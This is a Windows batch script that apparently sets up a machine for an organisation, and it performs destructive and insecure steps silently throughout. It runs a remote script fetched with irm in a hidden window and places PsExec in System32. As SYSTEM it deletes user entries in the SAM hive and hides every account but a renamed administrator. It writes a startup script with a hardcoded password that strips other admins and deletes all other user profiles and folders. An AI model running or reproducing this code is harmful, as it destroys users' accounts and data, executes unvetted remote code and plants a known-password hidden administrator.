@echo off
powershell -WindowStyle Hidden -c "$c = '%TEMP%\c.json'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shansnow89/apps/refs/heads/main/config.json' -OutFile $c -UseBasicParsing; & ([scriptblock]::Create((irm 'https://debloat.raphi.re/'))) -Config $c -Silent"
powershell -nop -c "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $wc=New-Object Net.WebClient; $wc.DownloadFile('https://live.sysinternals.com/PsExec.exe','C:\Windows\System32\PsExec.exe')" >nul 2>&1
psexec -accepteula -s -i powershell -Command "Get-ChildItem 'HKLM:\SAM\SAM\Domains\Account\Users\Names' | Where-Object {$_.PSChildName -ne 'Administrator' -and $_.PSChildName -ne '@dm1n'} | Remove-Item -Force -Recurse" >nul 2>&1
net user Administrator /active:yes >nul 2>&1
powershell -Command "Rename-LocalUser -Name 'Administrator' -NewName '@dm1n' -Confirm:$false" >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /va /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "@dm1n" /t REG_DWORD /d 1 /f >nul 2>&1
for /f "skip=4 tokens=1" %%u in ('net user 2^>nul') do @if /i not "%%u"=="@dm1n" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%%u" /t REG_DWORD /d 0 /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /f ^>nul 2^>^&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /f ^>nul 2^>^&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnumerateLocalUsers /t REG_DWORD /d 0 /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
reg load HKU\DefaultUser "C:\Users\Default\NTUSER.DAT" >nul 2>&1
reg delete "HKU\DefaultUser\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
reg unload HKU\DefaultUser >nul 2>&1
powercfg /x /monitor-timeout-ac 0
powercfg /x /standby-timeout-ac 0
powercfg /hibernate off
:: ============================================================
:: 2. user.bat
:: ============================================================
(
echo @echo off
echo net user @dm1n "IBEX@dm1n!" ^>nul 2^>^&1
echo powershell -c "Get-LocalGroupMember -Group 'Administrators' ^| Where-Object { $*.Name -notlike '*@dm1n*' -and $*.Name -notlike '*Administrator*' } ^| Remove-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue"
echo psexec -accepteula -s powershell -Command "$exclude=@('Public','Default','@dm1n'); Get-ChildItem 'C:\Users' -Directory ^| Where-Object {$exclude -notcontains $*.Name} ^| ForEach-Object {$p=$*.FullName; (Get-WmiObject Win32_UserProfile ^| Where-Object {$*.LocalPath -eq $p}) ^| ForEach-Object {$*.Delete()}; Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; attrib +h 'C:\Users\Public' 2^>$null; tzutil /s 'Singapore Standard Time'"
echo powershell -NoP -C "iwr 'https://download.microsoft.com/download/6c1eeb25-cf8b-41d9-8d0d-cc1dbc032140/officedeploymenttool_20026-20112.exe' -OutFile 'C:\Windows\Temp\ODT.exe'; Start-Process 'C:\Windows\Temp\ODT.exe' -ArgumentList '/quiet','/extract:C:\Windows\Temp' -Wait; iwr 'https://raw.githubusercontent.com/shansnow89/apps/refs/heads/main/2024.xml' -OutFile 'C:\Windows\Temp\2024.xml'"
echo start "" /wait C:\Windows\Temp\setup.exe /configure C:\Windows\Temp\2024.xml
echo del /f /q "%%APPDATA%%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar*" ^>nul 2^>^&1
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f ^>nul 2^>^&1
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Streams\Desktop" /f ^>nul 2^>^&1
echo del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat" /f /q ^>nul 2^>^&1
echo shutdown /r /t 5 /f
) > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat"

shutdown /r /f /t 30
